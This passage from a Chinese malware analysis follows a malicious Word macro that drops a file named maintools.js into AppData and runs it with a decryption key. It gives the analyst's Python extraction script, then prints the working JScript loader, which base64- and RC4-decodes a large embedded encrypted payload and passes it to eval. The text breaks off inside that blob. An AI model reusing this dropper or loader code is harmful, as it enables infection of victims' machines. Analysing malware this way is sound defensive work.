然后，这一段是说，定义了一个16827长度的数组 Wk4o3X7x1134j ，在刚刚匹配到的字符的索引向后偏移81个字符的位置，读取16827个字节，存到这个数组里面去

这里调用了前面那个解密的函数，将恶意负载解密

值得注意的是，那个特定的字符串，就是80个字节，也就是说，其寻找的位置就是紧挨着这个字符串后面的16827个字节

```basic
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
        Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
        If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
            B8qen2T433Ds1bW = Environ("appdata")
        End If
        Set R7Ks7ug4hRR2weOy7 = Nothing
        Dim K764B5Ph46Vh
        K764B5Ph46Vh = FreeFile
        OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open(OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh# Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j# Close #K764B5Ph46Vh# Erase Wk4o3X7x1134j
            Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
            R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
            ActiveDocument.Save
            Exit Sub
```

然后构造一个路径，将一个名为maintool.js的文件存到appdata里面去

并把maintool.js启动，将EzZETcSXyKAdF_e5I2i1这个字符串传入其中

（也就是这句话R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"）



这里面唯一一个可能成为密钥的，只有EzZETcSXyKAdF_e5I2i1这个字符串



此时不妨尝试去看看maintools.js到底写了什么

要提取出这个文件，首先得找到这个定位的索引到底在什么位置

f = open('C:\\Users\HUAWEI\Desktop\\病毒隔离区\\49b367ac261a722a7c2bbbc328c32545', 'rb').read()
p = f.find(b'MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh')
print(p)
<img src="/Picture/WpDF/Pinghang/2026Group/115.png" width="1116.5" title="" crop="0,0,1,1" id="ua58f6d3f" class="ne-image">

148078，然后加上80，得到148158

值得注意的是，get语句是1-based，也就是说，从1开始计数而非0，但前面返回的索引是0-based，所以真正的偏移应该减少1（其实应该能注意到，这里偏移的目的就是把这个目标模式给跳过）

然后从148158开始，提取16827个字节

将这个文件进行异或处理，输出得到js文件

f = open(r'C:\\Users\\HUAWEI\Desktop\\病毒隔离区\\49b367ac261a722a7c2bbbc328c32545', 'rb').read();
data = f[148158 : 148158 + 16827];  # 从 148158 开始，提取 16827 字节
print(f'提取了 {len(data)} 字节');
data = bytearray(data);

with open(r'C:\\Users\\HUAWEI\\Desktop\\extracted_data.bin', 'wb') as out:
    out.write(data);

key = 45;
for i in range(len(data)):
    data[i] = data[i] ^ key;
    # THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
    key = ((key ^ 99) ^ (i % 254));

with open(r'C:\\Users\\HUAWEI\\Desktop\\extracted_data.js', 'w', errors='ignore') as out:
    out.write(&quot;&quot;.join(chr(i) for i in data));得到的js文件
try{var wvy1 = WScript.Arguments;var ssWZ = wvy1(0);var ES3c = y3zb();ES3c = LXv5(ES3c);ES3c = CpPT(ssWZ,ES3c);eval(ES3c);  

}catch (e)

{WScript.Quit();}function MTvK(CgqD){var XwH7 = CgqD.charCodeAt(0);if (XwH7 === 0x2B || XwH7 === 0x2D) return 62

if (XwH7 === 0x2F || XwH7 === 0x5F) return 63

if (XwH7 &lt; 0x30) return -1

if (XwH7 &lt; 0x30 + 10) return XwH7 - 0x30 + 26 + 26

if (XwH7 &lt; 0x41 + 26) return XwH7 - 0x41

if (XwH7 &lt; 0x61 + 26) return XwH7 - 0x61 + 26

}function LXv5(d27x){var LUK7 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;var i;var j;var n6T8;if (d27x.length % 4 &gt; 0)

return;var CHlB = d27x.length;var V8eR = d27x.charAt(CHlB - 2) === '=' ? 2 : d27x.charAt(CHlB - 1) === '=' ? 1 : 0

var mjqo = new Array(d27x.length * 3 / 4 - V8eR);var z8Ht = V8eR &gt; 0 ? d27x.length - 4 : d27x.length;var t2JG = 0;function XGH6 (b0tQ){mjqo[t2JG++] = b0tQ;}for (i = 0,j = 0; i &lt; z8Ht; i += 4,j += 3){n6T8 = (MTvK(d27x.charAt(i)) &lt;&lt; 18) | (MTvK(d27x.charAt(i + 1)) &lt;&lt; 12) | (MTvK(d27x.charAt(i + 2)) &lt;&lt; 6) | MTvK(d27x.charAt(i + 3));XGH6((n6T8 &amp; 0xFF0000) &gt;&gt; 16)

XGH6((n6T8 &amp; 0xFF00) &gt;&gt; 8)

XGH6(n6T8 &amp; 0xFF)

}if (V8eR === 2){n6T8 = (MTvK(d27x.charAt(i)) &lt;&lt; 2) | (MTvK(d27x.charAt(i + 1)) &gt;&gt; 4)

XGH6(n6T8 &amp; 0xFF)

}else if (V8eR === 1){n6T8 = (MTvK(d27x.charAt(i)) &lt;&lt; 10) | (MTvK(d27x.charAt(i + 1)) &lt;&lt; 4) | (MTvK(d27x.charAt(i + 2)) &gt;&gt; 2)

XGH6((n6T8 &gt;&gt; 8) &amp; 0xFF)

XGH6(n6T8 &amp; 0xFF)

}return mjqo

}function CpPT(bOe3,F5vZ)

{var AWy7 = [];var V2Vl = 0;var qyCq;var mjqo = '';for (var i = 0; i &lt; 256; i++)

{AWy7[i] = i;}for (var i = 0; i &lt; 256; i++)

{V2Vl = (V2Vl + AWy7[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;qyCq = AWy7[i];AWy7[i] = AWy7[V2Vl];AWy7[V2Vl] = qyCq;}var i = 0;var V2Vl = 0;for (var y = 0; y &lt; F5vZ.length; y++)

{i = (i + 1) % 256;V2Vl = (V2Vl + AWy7[i]) % 256;qyCq = AWy7[i];AWy7[i] = AWy7[V2Vl];AWy7[V2Vl] = qyCq;mjqo += String.fromCharCode(F5vZ[y] ^ AWy7[(AWy7[i] + AWy7[V2Vl]) % 256]);}return mjqo;}function y3zb()

{var qGxZ = &quot;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